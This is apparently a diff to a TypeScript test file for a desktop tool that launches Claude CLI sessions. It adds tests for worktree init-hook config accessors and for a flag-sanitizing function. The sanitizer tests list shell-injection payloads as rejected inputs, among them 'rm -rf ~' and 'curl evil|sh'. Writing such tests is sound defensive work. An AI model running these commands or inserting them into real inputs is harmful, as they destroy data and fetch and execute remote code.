@@ -8,9 +8,12 @@ import {
   resolveLaunchConfig,
   DEFAULT_LAUNCH_COMMAND,
   DEFAULT_MODELS,
-  localConfigPath
+  localConfigPath,
+  projectWorktreeInit,
+  globalWorktreeInit,
+  globalConfigDir
 } from "../desktop/src/main/launch-config.ts";
-import { buildSessionCommandLine, quotePromptArg } from "../desktop/src/main/session-command.ts";
+import { buildSessionCommandLine, quotePromptArg, sanitizeFlagValue } from "../desktop/src/main/session-command.ts";
 import { buildShellInvocation } from "../desktop/src/main/shell-command.ts";
 
 const tmpDirs: string[] = [];
@@ -283,6 +286,45 @@ test("an empty/whitespace prompt never emits a positional arg", () => {
     mode: "fresh"
   });
   expect(line).toBe("claude run --session-id id-1");
+});
+
+// ----- B5: worktreeInit accessors (gated at startup in index.ts) -----
+
+test("projectWorktreeInit reads the project-local hook, null when absent", () => {
+  const proj = tmpProject();
+  expect(projectWorktreeInit(proj)).toBeNull();
+  writeLocalConfig(proj, { launchCommand: "claude", worktreeInit: "bun install" });
+  expect(projectWorktreeInit(proj)).toBe("bun install");
+});
+
+test("globalWorktreeInit reads the global hook, undefined when absent", () => {
+  const g = tmpProject();
+  const env = { APPDATA: g, XDG_CONFIG_HOME: g } as NodeJS.ProcessEnv;
+  expect(globalWorktreeInit(env)).toBeUndefined();
+  const dir = globalConfigDir(env);
+  mkdirSync(dir, { recursive: true });
+  writeFileSync(join(dir, "config.json"), JSON.stringify({ worktreeInit: "npm ci" }), "utf-8");
+  expect(globalWorktreeInit(env)).toBe("npm ci");
+});
+
+// ----- B6: agent/model flag sanitization -----
+
+test("sanitizeFlagValue passes real agent/model ids, including the 1M form", () => {
+  expect(sanitizeFlagValue("general-purpose")).toBe("general-purpose");
+  expect(sanitizeFlagValue("claude-opus-4-8")).toBe("claude-opus-4-8");
+  expect(sanitizeFlagValue("claude-opus-4-8[1m]")).toBe("claude-opus-4-8[1m]");
+  expect(sanitizeFlagValue("openai:gpt-4o")).toBe("openai:gpt-4o");
+  expect(sanitizeFlagValue("openrouter/anthropic/claude")).toBe("openrouter/anthropic/claude");
+  expect(sanitizeFlagValue("  reviewer  ")).toBe("reviewer");
+});
+
+test("sanitizeFlagValue rejects shell-injection payloads (returns '')", () => {
+  expect(sanitizeFlagValue('x$(touch /tmp/pwned)')).toBe("");
+  expect(sanitizeFlagValue("x; rm -rf ~")).toBe("");
+  expect(sanitizeFlagValue("x`id`")).toBe("");
+  expect(sanitizeFlagValue('x" ; echo hi #')).toBe("");
+  expect(sanitizeFlagValue("x && curl evil|sh")).toBe("");
+  expect(sanitizeFlagValue("")).toBe("");
 });
 
 // ----- shell-command -----
